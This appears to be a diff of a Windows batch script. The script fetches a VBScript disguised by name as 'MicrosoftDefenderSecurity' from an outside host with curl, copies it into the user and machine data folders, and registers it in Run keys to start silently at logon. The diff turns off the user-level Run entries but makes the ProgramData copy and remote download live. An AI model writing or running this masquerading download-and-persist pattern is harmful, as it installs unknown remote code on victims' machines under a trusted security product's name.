@@ -70,27 +70,30 @@ set pcregistryfile=YES, NEW CREATED
 
 
 if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
-set userregistryauto=YES
+::reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
+::set userregistryauto=YES
+set userregistryauto=NO
 )
 if not exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
 copy /y "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%APPDATA%\MicrosoftDefenderSecurity\"
 curl -L "https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs" --output "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs"
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
-set userregistryauto=YES, NEW CREATED
+::reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
+::set userregistryauto=YES, NEW CREATED
+set userregistryauto=NO
 )
 
 
 if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
 ::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
-set pcregistryauto=YES
+::set pcregistryauto=YES
+set pcregistryauto=NO
 )
 if not exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
 ::check for admin rights, commented out
 ::NET SESSION >nul 2>&1
 ::IF %ERRORLEVEL% EQU 0 (
-::copy /y "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%PROGRAMDATA%\MicrosoftDefenderSecurity\"
-::curl -L "https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs" --output "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs"
+copy /y "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%PROGRAMDATA%\MicrosoftDefenderSecurity\"
+curl -L "https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs" --output "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs"
 ::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
 ::set pcregistryauto=YES, NEW CREATED
 ::) ELSE (
